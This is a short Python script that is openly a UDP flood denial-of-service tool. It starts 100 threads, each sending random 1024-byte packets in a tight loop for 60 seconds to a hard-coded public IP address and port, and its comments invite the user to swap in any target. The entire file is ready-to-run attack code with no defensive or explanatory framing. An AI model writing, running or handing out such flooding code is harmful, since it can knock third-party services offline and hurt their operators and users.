import socket
import random
import time
import threading

def attack(ip, port, duration):
    print(f"Attacking {ip}:{port} for {duration} seconds")
    start_time = time.time()
    while True:
        if time.time() - start_time >= duration:
            break
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((ip, port))
        payload = bytes([random.randint(0, 255) for _ in range(1024)])
        sock.send(payload)
        sock.close()
        time.sleep(0.001)

def main():
    ip = "20.219.163.225"  # Replace with target IP
    port = 15190  # Replace with target port
    duration = 60  # Replace with attack duration in seconds
    num_threads = 100  # Replace with number of threads

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(ip, port, duration))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
